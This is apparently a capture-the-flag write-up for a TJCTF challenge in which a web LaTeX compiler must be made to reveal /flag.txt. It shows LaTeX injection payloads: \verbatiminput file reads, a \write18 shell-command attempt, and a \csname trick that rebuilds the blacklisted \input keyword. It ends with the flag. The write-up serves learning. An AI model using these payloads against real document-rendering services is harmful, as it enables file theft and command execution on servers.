## TeXploit

---

### Challenge

I made a LaTex compiler that can generate pdfs. It even prints the log file if there is an error. The flag is located in `/flag.txt`

[https://instancer.tjctf.org/challenge/texploit](https://instancer.tjctf.org/challenge/texploit)

---

### Solution

In the Latex compiler, I tried giving different payloads. If I were to give just hello, it would show me a pdf with hello printed. But I want payloads that can print `flag.txt`

```
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/flag.txt}
\end{document}
```
![image](https://github.com/user-attachments/assets/1c24b613-9bd7-4a2b-9047-ca545d8ab8c1)

While trying multiple payloads like this, I found that `input`, `include`, `repeat` etc are blacklisted keywords.

So I tried crafting my payload without them. For example: `\immediate\write18{cat /flag.txt}`. Here `\write18` is Latex's way of executing shell commands but I encountered an error.

![image](https://github.com/user-attachments/assets/8c49c343-50bf-48e0-9e71-999a331a8cc3)

Next, I tried a payloads that obfuscates the input so that it won't be filtered.

```
\def\x{i}
\def\y{nput}
\csname \x\y\endcsname{/flag.txt}
```

![image](https://github.com/user-attachments/assets/00aefa4d-6691-41f8-9ad7-1034a4d5e298)

In this output, I can see parts of what appears to be the flag. When I put it together, I got the right flag.

---

### Flag

`tjctf{f1l3_i0_1n_l4t3x?}`
